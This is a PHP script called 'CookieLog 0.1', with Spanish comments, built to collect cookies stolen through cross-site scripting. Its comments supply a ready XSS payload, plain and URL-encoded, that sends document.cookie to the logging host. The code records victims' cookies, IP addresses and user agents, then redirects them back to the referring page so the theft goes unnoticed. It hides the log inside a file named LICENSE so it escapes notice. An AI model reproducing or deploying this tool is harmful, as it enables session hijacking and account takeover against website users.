
<?php
	/*
	Es un pequeño script orientado a registrar las cookies de posibles Injecciones XSS a treceros, 
	recibiendolas como parámetro GET. 
	Además registra las cookies de los usuarios que visitan la página en la que se injecta el script.

	http://example.com/?c=view 			Muestra las COOKIES capturadas en htdocs/$logpath
	http://example.com/?c="{COOKIES}" 	Registra el parámetro &c
	
	curl http://example.com/ -d c=view&o=1 -G

	<script>window.location="http://example.com/?c="+document.cookie;</script>
	%3Cscript%3Ewindow.location%3D%22http%3A%2F%2Fexample.com%2F%3Fc%3D%22%2Bdocument.cookie%3B%3C%2Fscript%3E

	Pendiente:
		- Crear el archivo de log si no existe
		- Guardar log en un archivo remoto
		- ERROR: No redirecciona cuando el argumento &c esta vacio
		- Evitar que la redirección entre en bucle (Si la fuente tiene XSS Persistent en la pagina principal, redireccionar a bing)
		- Añadir una opcion para borrar el log de Cookies, conservando el contenido del archivo que no sea log

	Realizado:
		- Evitar que la redirección entre en bucle (No incluir el código XSS Reflected en la URL)
		- Capturar siempre un log. Excepto un modo de incógnito.
		- Utilizar un archivo con otro texto para ocultar el log.
	*/
	echo '<!DOCTYPE HTML><html><head><meta charset="utf-8">';
	echo '<title>CookieLog 0.1</title>'; 
	echo '</head><body></body></html>';

	$logpath = '../LICENSE'; 	/*Ruta (desde el lugar donde se ejecuta el script) y nombre del archivo donde se guardarán los 						
								logs. Debe existir y tener permisos de lectura y escritura para cualquier usuario. Por eso conviene 						
								ocultarlo en el directorio anterior a htdocs. Se necesita ser usuario administrador para poder 						
								editar los permisos. También puede utilizarse un archivo existente con permisos de lectura y 						
								escritura.*/
	$logsize = 18372; 			/*Tamaño del archivo de los logs, en bytes. '0': leerá todo el archivo a la hora de visualizarlo. 						
								Puedes utilizar un archivo LICENSE real para hacer pasar inadvertido el log. En tal caso, el valor 						
								de $logsize debería ser el tamaño del archivo LICENSE, para que empiece a leer al final. No afecta 						
								al proceso de escritura.*/
	$log_all_traffic = false;	/*Registra todo el trafico, incluyendo las peticiones a la pagina sin cookies*/

	$c = $_GET['c'];

	if($c == "view")
	{
			$fr = fopen($logpath, 'r'); 	//En servidores WINDOWS si el archivo de log no es .txt cambiar 'r' por 'rb'
			fseek($fr, 0, SEEK_END);
			//echo ftell($fr); die();		//Descomentar y utilizar ?c=view para saber el tamaño, en bytes, del archivo $logpath. 
			$filesize = ftell($fr)-$logsize; 
			fseek($fr, $logsize, SEEK_SET);
			echo fread($fr, $filesize);
			fclose($fr);
	}
	else
	{
		if(isset($_COOKIE) || $log_all_traffic || strlen($c) > 0)
		{
			$fw = fopen($logpath, 'a');
			if($_SERVER["HTTP_X_FORWARDED_FOR"])
			{ 
				fwrite($fw,	"\nIP:[{$_SERVER['HTTP_X_FORWARDED_FOR']}] PROXY:[{$_SERVER['REMOTE_ADDR']}] REMOTE_HOST:[{$_SERVER['REMOTE_HOST']}] USER:[{$_SERVER['REMOTE_USER']}]");
			}
			else
			{ 
				fwrite($fw, "\nIP:[{$_SERVER['REMOTE_ADDR']}] REMOTE_HOST:[{$_SERVER['REMOTE_HOST']}] USER:[{$_SERVER['REMOTE_USER']}]");
			}
			fwrite($fw, " (".date('l jS \of F Y h:i:s A').")\n");
			//Registro de las cookies del usuario que visita la página
			foreach ($_COOKIE as $cookie_name => $cookie_value)
			{
				fwrite($fw, "{$cookie_name} : {$cookie_value}\n");
			}
			//Registro de las cookies en el parámetro 'c'
			if(strlen($c) > 0)
			{
				fwrite($fw, "[COOKIE CAPTURED]--------------------------------------------------------------------\n{$c}\n");
			}
			fwrite($fw, "USER_AGENT:[{$_SERVER['HTTP_USER_AGENT']}]\nREFERER:[{$_SERVER['HTTP_REFERER']}]\n"."ARGUMENTS:[{$_SERVER['argv']}]\n");
			fclose($fw);
		}
	}
	//Redireccionamiento. En caso de que se haya accedido a traves de un link en otra web se redireccionará de vuelta.	
	if(strlen($_SERVER['HTTP_REFERER']) > 0)
	{
		$refl = $_SERVER['HTTP_REFERER'];
		$refa = explode("/",$refl);
		$ref = "{$refa[0]}//{$refa[2]}/";
		header("Location: {$ref}");
	}
?>
